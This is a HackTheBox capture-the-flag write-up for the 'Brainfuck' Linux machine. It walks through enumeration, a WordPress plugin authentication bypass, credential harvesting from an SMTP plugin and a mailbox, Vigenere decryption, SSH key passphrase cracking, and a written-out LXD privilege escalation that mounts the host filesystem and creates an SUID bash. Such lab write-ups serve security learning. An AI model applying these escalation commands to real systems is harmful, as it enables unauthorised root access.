---
layout: post
title:  "HTB Writeup [Linux - Insane] - Brainfuck"
published: false
---

![Sniper](/assets/Brainfuck/Brainfuck.png)

### Summary
- A **Linux** box where we find **email ports (SMTP/POP/IMAP)** open as well as **two https websites** (we discovered them from the **SSL certificate Subject Alternative Name** field)
- One website had a **Wordpress blog** which happened to have a ***vulnerable component*** that enabled us to impersonate the `admin` user.
- *After failing to get code execution using traditional ways* (***editing Wordpress themes and uploading malicious plugins***), we search more to **find email credentials for the `orestis` user in the installed SMTP plugin.**
- We **configure a mail client with IMAP** and **retrieve the mailbox contents** for the `orestis` user to **gain another set of credentials for the other website (a forum)**.
- *After logging in,* **we find an accouncement** where the `administrator` **mentions that SSH password-based authentication has been disabled in favor of key-based login.**
- *Since the `orestis` user* ***lost his key***, he is now **locked out** and **is looking to get his key for access.**
- The `administrator` says **he won't provide the SSH key in the discussion thread because it would be visible to all forum members**. So they **switch over to an encrypted one**.
- *Looking at the* **cipher text** *on that thread*, we **do some research to recognize the cipher in use**. We find out it's a **Vigenere Cipher** and ***are able to figure out the key.***
- *After* ***decrypting the messages on the thread***, **we get a URL for a passphrase-protected SSH key**. One we crack using `john`.
- We finally login as the `orestis` user to find out **he's a member of the `lxd` group**. **This enables us to escalate our privileges to `root` due the insecure features of LXD.**

---

### NMAP for the roadmap
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login Pre-login IMAP4rev1 have LOGIN-REFERRALS ID capabilities IDLE more OK SASL-IR ENABLE AUTH=PLAINA0001 listed LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
***Looking at the nmap scan results***, we notice:
1. **SSH version < 7.7** which **allows for user enumeration** (*we might need that to confirm some users' existence on the box*)
2. **Mail ports: 25, 110 & 143 for SMTP, POP and IMAP** (**SMTP** = we **can send malicious emails** and **launch client-side attacks** while **IMAP** and **POP3** can **give us access to user mailboxes if we have credentials**)
3. **HTTPS** on port 443 is a nice **web-based attack surface** for us to explore

But we notice that the **nmap default script** gave us **a couple of host names** in the `commonName` and `Subject Alternative Name` fields:
- **brainfuck.htb**
- **www.brainfuck.htb**
- **sup3rs3cr3t.brainfuck.htb**

**We add those to our** `/etc/hosts`.

![](/assets/Brainfuck/setting-etc-hosts.jpg)

### Checking out the websites
We take a look at **www.brainfuck.htb** to find a **Wordpress blog**

![](/assets/Brainfuck/wordpress-first-look.jpg)

**It's rich with information:**
1. we find **two usernames**: `admin` and `orestis`
2. we find **a note about integration with SMTP**. *Possibly a* ***hint***
3. we notice **a link to "open a ticket"**. This could be a **Wordpress plugin** with exploitable functionalities.

### Enumerating Wordpress
*At this point,* it's both a ***quick and easy check*** to run `wpscan`. It's **specialized for scanning Wordpress** and **would give us tons of information on it**.

***Running it like below:***
```bash
wpscan --url https://brainfuck.htb/ -e ap,at,tt,cb,dbe,u --disable-tls-checks
```

would enable us to **enumerate** (`-e`):
- All plugins `ap`
- All themes `at`
- Timthumbs `tt`
- Config backups `cb`
- Database exports `dbe`
- And, Wordpress users `u`

*Looking at the results,* we find **something interesting:**

![](/assets/Brainfuck/wp-plugin-discovered.jpg)

We do a search on [Exploit-DB](/assets/Brainfuck/https://www.exploit-db.com/) to find that **there is couple of verified exploits that match the version we have**:

![](/assets/Brainfuck/exploit-db-plugin.jpg)

*At first,* we check out **the SQL injection one**. But we find out that **it requires at least one valid user**:

![](/assets/Brainfuck/vuln1-user-access-required.jpg)

*Luckily however,* the second one **doesn't require authentication:**

![](/assets/Brainfuck/vuln2-user-access-not-required.jpg)

And **the PoC seems straightforward**. Just a **form we have to submit:**

![](/assets/Brainfuck/vuln2-poc.jpg)

We **edit the exploit** to **match the Wordpress URL** like below:

![](/assets/Brainfuck/html-exploit-edited.jpg)

And **open the html with Firefox:**

![](/assets/Brainfuck/html-exploit-firefox.jpg)

*After submitting the form,* we notice that **the response gives us a bunch of cookies**

![](/assets/Brainfuck/exploit-request-and-response.jpg)

And we **confirm that the exploit works** after visiting the **website's main page and finding a session with `administrator`**

![](/assets/Brainfuck/html-exploit-working.jpg)

**Great!** *but even though the exploit worked*, the `administrator` user ***didn't have much access.***

![](/assets/Brainfuck/wp-administrator-low-access.jpg)

***Knowing of the other*** `admin` ***user from both the homepage and*** `wpscan`, we **used the exploit to gain access with the** `admin` **user instead.**

![](/assets/Brainfuck/wp-found-users.jpg)

### Trying to abuse Wordpress with the Admin account
*After logging in as* `admin`, we find out that **we have access to much more things** than with `administrator`

![](/assets/Brainfuck/wp-admin-access.jpg)

*Because* **Wordpress** *themes use* **PHP**, we try to **edit the templates** and **add a reverse shell.**

But **our user didn't seem to have that access.**

![](/assets/Brainfuck/cant-edit-wp-themes.jpg)

We instead try to **upload a malicious plugin**. **No luck here either :/**

![](/assets/Brainfuck/cant-upload-plugin.jpg)

***Having phased out the traditional ways of exploiting Wordpress***, we look around for other venues.

We **find another plugin: Easy WP SMTP** ***(the one hinted about in the home page)***

![](/assets/Brainfuck/smtp-plugin-discovered.jpg)

*After going into its* ***settings***, we notice **a saved password** that **we can extract from the html**

![](/assets/Brainfuck/smtp-password-looted.jpg)

### Rummaging through people's mailboxes :D

***Given the available IMAP service on port 143,*** we can go through the `orestis` user's **mailbox.**

We will **install** and **configure a mail client** called `evolution`

```bash
apt install evolution
```

*After starting it,* we go to **Edit > Accounts**

![](/assets/Brainfuck/evo-accounts.jpg)

*After selecting the* **"Mail Account"** *option*, we **proceed through the account setup process**

![](/assets/Brainfuck/evo-identity.jpg)

![](/assets/Brainfuck/evo-rev-mail.jpg)

![](/assets/Brainfuck/evo-send-mail.jpg)

![](/assets/Brainfuck/evo-password.jpg)

We **successfully log in** to find **another set of credentials** waiting for us in the **inbox** :D

![](/assets/Brainfuck/forum-creds-in-mailbox.jpg)

### Visiting the Forum

*Going into the* **forum** at `https://sup3rs3cr3t.brainfuck.htb/`, we see nothing on the main page except for a **test thread**

![](/assets/Brainfuck/test-thread.jpg)

We log in as `orestis` to find **two more threads**:

![](/assets/Brainfuck/2-more-threads.jpg)

***On the SSH Access thread:***

![](/assets/Brainfuck/ssh-access-thread.jpg)

It seems like **the server administrator changed the SSH settings** to **only allow key-based authentication.**

*This, however,* **locked out** the `orestis` user who now **wants his key to regain access.**

***But, since exposing they key on the forum isn't feasable,*** they decide to **move to an encrypted thread**

![](/assets/Brainfuck/encrypted-thread.jpg)

**It's gibberish here XD**

But the **protocol notation** `://` indicates that this **might be a URL**. Specially because **the number of characters** in `mnvze` **matches the number of characters in** `https`.

*And since this thread is about* `orestis` ***receiving SSH access***, we're **determined to figure this out :)**

*But knowing i'm no wizard when it comes to* ***Cryptography***, I **seek Google's help with a search: "detect cipher text"**

![](/assets/Brainfuck/google-detect-cipher.jpg)

I **choose the first search result** and paste in **the longest line of text**. This is **to give the website a good sample for analysis**.

Here were the results:

![](/assets/Brainfuck/cipher-analysis.jpg)

The tool **is most confident in the cipher being of the "Vigenere type".**

So I **switch over** to **the Vigenere decryption page** and **select "Automatic Decryption"**

![](/assets/Brainfuck/automatic-decryption-results.jpg)

The results on the left showed that **the tool is trying decryption keys like**:
- FUCKMYBBOIN
- FUCKMYLSOIN
- FUCKMYBBNIN
- FUCKMYBBCHN

And **getting some really coherent results**. ***But not quite fully.***

So I decide to **try some english words** ***(since the sentence is in natural language).***

*Following the machine's naming,* **I tried "FUCKMYBRAIN" as a key.**

![](/assets/Brainfuck/cipher-decrypted.jpg)

**It worked! XD**

### SSH Access as Orestis

*Visiting the url,* we **get a private SSH key:**

![](/assets/Brainfuck/ssh-key-found.jpg)

**we're asked for a passphrase** when trying to use it.

![](/assets/Brainfuck/passphrase-required.jpg)

We **convert the key to john format and crack it** with `rockyou.txt`

![](/assets/Brainfuck/key-cracked.jpg)

**then login:**

![](/assets/Brainfuck/in-as-orestis.jpg)

### LXD Privilege Escalation

*Right after logging in,* and ***from the previous screenshot***, we notice that `orestis` **is part of the** `lxd` **group.**

![](/assets/Brainfuck/lxd-group.jpg)

*Following the* [article](/assets/Brainfuck/https://www.hackingarticles.in/lxd-privilege-escalation/) *from the awesome* **Hacking Articles** *blog*, we know that we can **escalate our privileges** using that membership.

Here's a quoted **brief description:**

```
A member of the local "lxd" group can instantly escalate the privileges to root on the host operating system.
This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password.
The vulnerability exists even with the LXD snap package.

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post.
This gives a low-privilege user root access to the host filesystem. 
```

we first **clone the** `lxd-alpine-builder` **repository** and **build the alpine image** with the `build-alpine` **script** to get the `.tar.gz` files below:

![](/assets/Brainfuck/building-alpine.jpg)

And we **transfer one over to the remote** `/tmp` **folder**

![](/assets/Brainfuck/transfer-alpine.jpg)

***To escalate our privileges,*** we:

1. Will first **import the image** and give it a suitable alias of `killerimage`
```bash
lxc image import alpine-v3.16-x86_64-20220816_1459.tar.gz --alias killerimage
```
2. **Verify that the import was a success**
```bash
lxc image list
```
3. Then **initialize the image** and **create a container** with the `security.privileged` option set to `true`
```bash
lxc init killerimage brainfucked -c security.privileged=true
```
4. **And proceed to mount the host's root filesystem** into the `/mnt/root` directory **within the container**
```bash
lxc config device add brainfucked mydevice disk source=/ path=/mnt/root recursive=true
```
5. **Afterwards, start the container** and **execute a bourne shell** (`sh`) (since it ***preserves the permission by default***)
```bash
lxc start brainfucked
lxc exec brainfucked /bin/sh
```
6. ***And, with the root privilege***, we will **create an SUID bash** in `/tmp` on the host
```bash
cp /mnt/root/bin/bash /mnt/root/tmp/bash
chmod +s /mnt/root/tmp/bash
```
7. ***After exiting the container shell,*** we can **run the the SUID bash** with the `-p` flag to **execute as root**

**It should all look like this:**

![](/assets/Brainfuck/rooted.jpg)

**A piece of cake :D**